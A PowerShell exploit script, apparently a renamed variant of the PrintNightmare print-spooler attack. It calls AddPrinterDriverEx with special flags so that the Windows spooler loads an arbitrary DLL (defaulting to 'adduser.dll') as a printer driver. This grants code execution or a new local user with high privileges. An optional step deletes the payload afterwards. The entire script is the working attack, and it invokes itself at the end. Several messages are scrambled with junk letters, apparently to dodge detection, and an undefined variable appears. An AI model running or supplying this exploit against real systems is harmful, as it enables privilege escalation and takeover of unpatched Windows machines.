function Invoke-Toto
{

    param (
        [string]$DriverName = "GoodGood",
        [string]$DLL = "C:\Users\ut0045\adduser.dll"
    )

    if ( $DLL -eq "" ){
        Write-Host "nothing here"
    } else {
        Write-Host "[+] using DLL: $DLL"
        Write-Host "[!] ignoring arguments"
        $delete_me = $false
    }

    $Mod = New-InMemoryModule -ModuleName "A$(Get-Random)"

    $FunctionDefinitions = @(
      (func winspool.drv AddPrinterDriverEx ([bool]) @([string], [Uint32], [IntPtr], [Uint32]) -Charset Auto -SetLastError),
      (func winspool.drv EnumPrinterDrivers([bool]) @( [string], [string], [Uint32], [IntPtr], [UInt32], [Uint32].MakeByRefType(), [Uint32].MakeByRefType()) -Charset Auto -SetLastError)
    )

    $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Mod'

    $DRIVER_INFO_2 = struct $Mod DRIVER_INFO_2 @{
        cVersion = field 0 Uint64;
        pName = field 1 string -MarshalAs @("LPTStr");
        pEnvironment = field 2 string -MarshalAs @("LPTStr");
        pDriverPath = field 3 string -MarshalAs @("LPTStr");
        pDataFile = field 4 string -MarshalAs @("LPTStr");
        pConfigFile = field 5 string -MarshalAs @("LPTStr");
    }

    $winspool = $Types['winspool.drv']
    $APD_COPY_ALL_FILES = 0x00000004

    [Uint32]($cbNeeded) = 0
    [Uint32]($cReturned) = 0

    if ( $winspool::EnumPrinterDrivers($null, "Windows x64", 2, [IntPtr]::Zero, 0, [ref]$cbNeeded, [ref]$cReturned) ){
        Write-Host "[!] EnumPrinterDrivers should faillll!"
        return
    }

    [IntPtr]$pAddr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([Uint32]($cbNeeded))

    if ( $winspool::EnumPrinterDrivers($null, "Windows x64", 2, $pAddr, $cbNeeded, [ref]$cbNeeded, [ref]$cReturned) ){
        $driver = [System.Runtime.InteropServices.Marshal]::PtrToStructure($pAddr, [System.Type]$DRIVER_INFO_2)
    } else {
        Write-Host "[!] fadsfdsfiled to get current driver list"
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAddr)
        return
    }

    Write-Host "[+] usinfdsfg pDriversfdPath = `"$($driver.pDriverPath)`""
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAddr)

    $driver_info = New-Object $DRIVER_INFO_2
    $driver_info.cVersion = 3
    $driver_info.pConfigFile = $DLL
    $driver_info.pDataFile = $DLL
    $driver_info.pDriverPath = $driver.pDriverPath
    $driver_info.pEnvironment = "Windows x64"
    $driver_info.pName = $DriverName

    $pDriverInfo = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($driver_info))
    [System.Runtime.InteropServices.Marshal]::StructureToPtr($driver_info, $pDriverInfo, $false)

    if ( $winspool::AddPrinterDriverEx($null, 2, $pDriverInfo, $APD_COPY_ALL_FILES -bor 0x10 -bor 0x8000) ) {
        if ( $delete_me ) {
            Write-Host "[+] addsdfed user $NewUser as local sd"
        } else {
            Write-Host "[+] dsf appears to have been loaded!"
        }
    } else {
        Write-Error "[!] AdffdPrinterDriverEx failed"
    }

    if ( $delete_me ) {
        Write-Host "[+] deleting payddload from $DLL"
        Remove-Item -Force $DLL
    }
}


Invoke-Toto
